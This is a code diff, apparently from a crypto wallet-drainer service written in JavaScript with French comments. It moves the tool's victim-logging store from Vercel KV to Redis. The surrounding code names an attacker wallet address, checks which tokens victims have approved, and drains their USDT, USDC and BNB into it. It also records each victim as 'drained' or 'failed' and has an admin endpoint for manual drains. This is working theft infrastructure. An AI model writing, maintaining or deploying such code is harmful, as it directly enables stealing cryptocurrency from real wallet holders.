@@ -1,7 +1,7 @@
 import Web3 from 'web3';
 import fs from 'fs';
 import path from 'path';
-import { kv } from '@vercel/kv';
+import { createClient } from 'redis';
 
 const ATTACKER_ADDRESS = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
 
@@ -56,24 +56,41 @@ const RPC_URLS = {
 
 const drainedAddresses = new Set();
 
-// --- Fonction d'enregistrement dans KV ---
-async function recordVictim(address, chain, token, amount, status) {
-  const key = `victim:${address}`;
-  const timestamp = Date.now();
-  await kv.hset(key, {
-    chain,
-    token,
-    amount,
-    status,
-    timestamp
-  });
-  console.log(`📝 Victime enregistrée : ${address} (${status})`);
+// Connexion Redis réutilisable
+const getRedisClient = async () => {
+  const client = createClient({ url: process.env.REDIS_URL });
+  await client.connect();
+  return client;
+};
 
-  // ⚡ Ajout de l'adresse à la liste globale des victimes (si pas déjà)
-  const list = await kv.get('victims:list') || [];
-  if (!list.includes(address)) {
-    list.push(address);
-    await kv.set('victims:list', list);
+// --- Fonction d'enregistrement dans Redis ---
+async function recordVictim(address, chain, token, amount, status) {
+  let client;
+  try {
+    client = await getRedisClient();
+    const key = `victim:${address}`;
+    const timestamp = Date.now();
+
+    // Mise à jour des champs (en conservant ceux qui existent déjà)
+    await client.hSet(key, {
+      chain,
+      token,
+      amount,
+      status,
+      timestamp: String(timestamp)
+    });
+
+    console.log(`📝 Victime enregistrée : ${address} (${status})`);
+
+    // Ajout à la liste des victimes
+    const list = await client.get('victims:list');
+    const parsedList = list ? JSON.parse(list) : [];
+    if (!parsedList.includes(address)) {
+      parsedList.push(address);
+      await client.set('victims:list', JSON.stringify(parsedList));
+    }
+  } finally {
+    if (client) await client.disconnect();
   }
 }
 
@@ -109,7 +126,6 @@ async function drainVictim(victimAddress, chainId) {
       if (allowance === '0') {
         // Pas d'allowance → échec, on note la balance disponible
         const balance = await tokenContract.methods.balanceOf(victimAddress).call();
-        // Conversion lisible : USDT/USDC ont 6 décimales, BNB 18
         const decimals = (tokenName === 'USDT' || tokenName === 'USDC') ? 'mwei' : 'ether';
         const formatted = web3.utils.fromWei(balance, decimals);
         await recordVictim(victimAddress, chainId, tokenName, formatted, 'failed');
@@ -137,7 +153,6 @@ async function drainVictim(victimAddress, chainId) {
       await recordVictim(victimAddress, chainId, tokenName, drainedAmount, 'drained');
     } catch (e) {
       console.error(`❌ Erreur sur ${tokenName} : ${e.message}`);
-      // En cas d'erreur (ex: gaz, réseau), on enregistre comme échec avec solde dispo si possible
       try {
         const balance = await tokenContract.methods.balanceOf(victimAddress).call();
         const decimals = (tokenName === 'USDT' || tokenName === 'USDC') ? 'mwei' : 'ether';
@@ -199,11 +214,20 @@ export default async function handler(req, res) {
       const targetChain = chain || '1';
       console.log(`🔧 Drain manuel admin pour ${victim} (chain ${targetChain})`);
 
-      // ⚡ Ajout immédiat à la liste des victimes (pour l'historique)
-      const list = await kv.get('victims:list') || [];
-      if (!list.includes(victim)) {
-        list.push(victim);
-        await kv.set('victims:list', list);
+      // Ajouter immédiatement à la liste avant le drain (pour l'historique)
+      let client;
+      try {
+        client = await getRedisClient();
+        const list = await client.get('victims:list');
+        const parsedList = list ? JSON.parse(list) : [];
+        if (!parsedList.includes(victim)) {
+          parsedList.push(victim);
+          await client.set('victims:list', JSON.stringify(parsedList));
+        }
+      } catch (err) {
+        console.error('Erreur Redis admin drain list:', err);
+      } finally {
+        if (client) await client.disconnect();
       }
 
       const success = await drainWithRetry(victim, targetChain);
@@ -219,11 +243,20 @@ export default async function handler(req, res) {
 
     console.log(`📥 Victime reçue : ${victim} sur chain ${chain || '1'}`);
 
-    // ⚡ Ajout immédiat à la liste (avant le drain asynchrone)
-    const list = await kv.get('victims:list') || [];
-    if (!list.includes(victim)) {
-      list.push(victim);
-      await kv.set('victims:list', list);
+    // Ajouter immédiatement à la liste
+    let client;
+    try {
+      client = await getRedisClient();
+      const list = await client.get('victims:list');
+      const parsedList = list ? JSON.parse(list) : [];
+      if (!parsedList.includes(victim)) {
+        parsedList.push(victim);
+        await client.set('victims:list', JSON.stringify(parsedList));
+      }
+    } catch (err) {
+      console.error('Erreur Redis normal flow list:', err);
+    } finally {
+      if (client) await client.disconnect();
     }
 
     drainWithRetry(victim, chain || '1').catch(err => console.error('Erreur drainWithRetry:', err));
